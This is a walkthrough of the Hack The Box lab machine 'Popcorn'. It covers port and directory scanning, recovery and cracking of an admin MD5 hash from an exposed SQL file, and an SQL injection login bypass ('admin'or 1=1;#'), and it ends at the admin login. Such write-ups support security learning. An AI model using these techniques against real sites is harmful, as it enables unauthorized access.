## -------------->> Popcorn <<------------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.6 -p-
---------

    Nmap scan report for 10.10.10.6
    Host is up (0.49s latency).
    Not shown: 65448 closed ports, 85 filtered ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
    |_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
    80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
    |_http-server-header: Apache/2.2.12 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

// Navigating to http://10.10.10.6

![Image 1]()

// Nothing much there, lets search for directories or files with [Feroxbuster](https://github.com/epi052/feroxbuster) Tool(By epi052)

    $ feroxbuster -u http://10.10.10.6/ -t 100 -w /usr/share/dirb/wordlists/big.txt 
----------

     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.3.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.10.6/
     🚀  Threads               │ 100
     📖  Wordlist              │ /usr/share/dirb/wordlists/big.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.3.1
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    403       10l       30w      286c http://10.10.10.6/cgi-bin/
    200        4l       25w      177c http://10.10.10.6/index
    301        9l       28w      309c http://10.10.10.6/rename
    200      654l     3106w        0c http://10.10.10.6/test
    301        9l       28w      310c http://10.10.10.6/torrent
    301        9l       28w      316c http://10.10.10.6/torrent/admin
    200        1l        4w       95c http://10.10.10.6/rename/index
    200      185l      476w        0c http://10.10.10.6/torrent/browse
    200      106l      206w     2988c http://10.10.10.6/torrent/admin/admin
    200       16l       92w      936c http://10.10.10.6/torrent/comment
    200        0l        0w        0c http://10.10.10.6/torrent/config
    301        9l       28w      314c http://10.10.10.6/torrent/css
    301        9l       28w      319c http://10.10.10.6/torrent/database
    200        0l        0w        0c http://10.10.10.6/torrent/download
    200        0l        0w        0c http://10.10.10.6/torrent/edit
    200        0l        0w        0c http://10.10.10.6/torrent/upload_file

// Lets navigate to http://10.10.10.6/torrent

![Image 2]()

// We can see its Torrents website, also we can see that feroxbuster search recursivly in /torrent directory

// and find us /database directory 

// Navigating to http://10.10.10.6/torrent/database we can see file called 'th_database.sql'

// Openning this file and rolling down we can see Admin credentials

![Image 3]()

    'Admin', '1844156d4166d94387f1a4ad031ca5fa'

// First lets analyz this hash with online [Hash analyzer](https://www.tunnelsup.com/hash-analyzer/)

![Image 4]()

// Now we know the hash is md5 we can decrypt it using again online [decrypt-md5](https://www.md5online.org/md5-decrypt.html) tool

![Image 5]()

// Back to http://10.10.10.6/torrent and try to login with the credential we found didnt work...

![Image 6]()

// So lets move on.. 

// earlier we found another directory called /test , lets check him out 

// It seems like the server php configuration file, But most interesting there its the option file_uploads and its 'On'

![Image 7]()

// So We can upload file

// But for upload we need to login(Alwayz we could create a user but i want to try other way)

// When tring few passwords to login admin i notice that one of the passwords i gave make the server to response with sql error

![Image 8]()

// So its may be possible that this login vulnerable to sql injection 

// This [website](http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html) helps me to understant little bit more about sql injection to bypass login 

![Image 9]()

    admin'or 1=1;#
    password

// And we loged in as admin !

![Image 10]()










